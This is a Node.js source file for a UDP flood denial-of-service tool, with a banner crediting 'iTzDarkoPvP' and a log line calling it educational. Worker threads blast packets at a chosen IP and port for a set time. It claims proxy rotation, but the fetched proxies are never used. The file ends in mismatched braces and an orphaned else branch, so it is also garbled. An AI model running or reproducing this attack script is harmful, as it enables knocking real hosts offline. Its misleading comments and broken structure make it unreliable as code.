const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');
const fetch = require('node-fetch');
const readline = require('readline');
const chalk = require('chalk');

// Logo de texto en rojo brillante
const logo = chalk.redBright(`
░█████╗░██╗░░░██╗██████╗░███████╗██████╗░░█████╗░██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗╚════██╗
██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██║░░╚═╝░░███╔═╝
██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░
╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║╚█████╔╝███████╗
░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝

==========================================================================

╭╮╱╱╭┳━━━┳━━━┳╮╱╭┳━━━┳━━━┳━━━┳━━━┳━━━┳╮╭━┳━━━┳━━━━┳━━━╮
┃╰╮╭╯┃╭━╮┃╭━╮┃┃╱┃┣╮╭╮┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫╭╮╭╮┃╭━╮┃
╰╮┃┃╭┫┃╱┃┃┃╱╰┫┃╱┃┃┃┃┃┃╰━╯┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯┃╰━━╋╯┃┃╰┫╰━━╮
╱┃╰╯┃┃╰━╯┃┃╱╭┫┃╱┃┃┃┃┃┃╭━━┻━━╮┃┃╱┃┃┃╱╭┫╭╮┃┃╭━━╯╱┃┃╱╰━━╮┃
╱╰╮╭╯┃╭━╮┃╰━╯┃╰━╯┣╯╰╯┃┃╱╱┃╰━╯┃╰━╯┃╰━╯┃┃┃╰┫╰━━╮╱┃┃╱┃╰━╯┃
╱╱╰╯╱╰╯╱╰┻━━━┻━━━┻━━━┻╯╱╱╰━━━┻━━━┻━━━┻╯╰━┻━━━╯╱╰╯╱╰━━━╯

==========================================================================

Owner : iTzDarkoPvP - v1.0.0
`);

// Función para obtener proxies
const getProxys = async () => {
    const response = await fetch('https://proxylist.geonode.com/api/proxy-list?limit=30&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5');
    const data = await response.json();
    return data.data;
};

// Validación de IP
const isValidIP = (ip) => {
    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return regex.test(ip);
};

// Función para iniciar el ataque UDP con rotación de proxies y control de velocidad
const iniciarAtaque = async (address, port, threads, time, pps, concurrentes) => {
    console.log(logo);
    console.log(chalk.greenBright('[~] - Script de DDOS para fines educativos'));

    if (!isValidIP(address)) {
        console.log(chalk.redBright('[~] - IP inválido'));
        return;
    }

    const proxies = await getProxys();
    console.log(chalk.greenBright(`[~] [PROXY] Obtenidos ${proxies.length} proxies.`));

    for (let j = 0; j < concurrentes; j++) {
        for (let i = 0; i < threads; i++) {
            console.log(chalk.greenBright(`[~] - Iniciando thread #${i}...`));

            const worker = new Worker(__filename, {
                workerData: { address, port, time, thread: i, proxies, pps }
            });
        }
    }

    console.log(chalk.greenBright("[~] - Iniciando en 3 segundos..."));
};

// Función para manejar los mensajes en los workers con rotación de proxies y control de velocidad
const handleWorkerMessage = async ({ address, port, time, thread, proxies, pps }) => {
    const client = dgram.createSocket('udp4');
    let task = null;
    let proxyIndex = 0;

    setTimeout(() => {
        task = setInterval(() => {
            for (let i = 0; i < pps; i++) {
                const proxy = proxies[proxyIndex];
                client.send(Buffer.from('data'), port, address, (error) => {
                    if (error) {
                        console.log(chalk.redBright(`[~] - Error #${thread} no fue posible enviar paquete para ${address}:${port} [${error}]`));
                        clearInterval(task);
                        console.log(chalk.redBright(`[~] - #${thread} Parado`));
                        return;
                    }
                });
                proxyIndex = (proxyIndex + 1) % proxies.length;
            }
            console.log(chalk.greenBright(`[~] - #${thread} Enviando para ${address}:${port}...`));
        }, 1000 / pps);
    }, 3000);

    setTimeout(() => {
        clearInterval(task);
        console.log(chalk.greenBright(`[~] - #${thread} Parado`));
    }, 1000 * 60 * time);

    console.log(chalk.greenBright(`[~] - #${thread} Iniciando`));
};

// Función para recibir y contar paquetes
const iniciarReceiver = (port = 0) => {
    const client = dgram.createSocket('udp4');
    const ipList = [];
    let messages = 0;

    client.on('listening', () => {
        const address = client.address();
        console.log(chalk.greenBright(`[~] - Ouvindo na porta ${address.port}...`));
    });

    client.on('message', (msg, rinfo) => {
        if (!ipList.includes(rinfo.address)) {
            ipList.push(rinfo.address);
            console.log(chalk.greenBright(`[~] - Novo IP: ${rinfo.address}`));
        }
        messages++;
    });

    setInterval(() => {
        if (messages > 0) {
            console.log(chalk.greenBright(`[~] - ${messages} pacotes por segundo`));
        }
        messages = 0;
    }, 1000);

    client.bind(port);
};

});
                });
            });
        });
    });
} else {
    handleWorkerMessage(workerData);
}
